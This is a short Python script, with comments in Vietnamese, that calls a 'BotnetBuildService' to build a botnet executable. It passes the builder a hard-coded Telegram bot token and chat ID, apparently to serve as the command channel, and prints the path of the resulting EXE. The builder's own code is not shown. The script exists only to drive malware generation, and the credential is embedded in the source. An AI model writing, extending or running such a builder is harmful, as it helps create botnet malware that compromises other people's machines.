import asyncio
from services.botnet_build_service import BotnetBuildService

async def main():
    token = '7651687881:AAGa8_Z245oMqx97dv5ijlWwGh1XwiibbmI'  # Thay bằng token mẫu
    chat_id = '2527630989'  # Thay bằng chat_id mẫu
    service = BotnetBuildService()
    exe_path = await service.build_botnet_exe(token=token, chat_id=chat_id)
    print(f'EXE path: {exe_path}')

if __name__ == '__main__':
    asyncio.run(main()) 